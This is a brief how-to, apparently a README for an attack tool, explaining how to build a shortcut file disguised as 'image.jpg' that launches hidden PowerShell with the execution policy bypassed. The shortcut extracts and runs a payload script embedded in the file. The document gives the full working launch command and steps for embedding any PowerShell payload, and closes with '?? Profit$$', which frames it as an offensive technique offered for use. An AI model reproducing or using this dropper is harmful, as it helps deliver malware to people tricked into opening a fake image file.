How to use:
1)Create shortcut named plantilla insert 
	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass "(Get-Content .\image.jpg.lnk | Select-Object -Skip 3) | Set-Content .\ca.ps1;Start-Process -FilePath \"powershell\" -ArgumentList \"-W Hidden -Exec Bypass .\ca.ps1\""

2)create powerpayload.ps1 with powershell payload to execute (leave or add a new empty line at top of script)

3)execute Createfile.ps1
	new file names image.jpg(.lnk) is created (do not rename or will not work)

4)?? Profit$$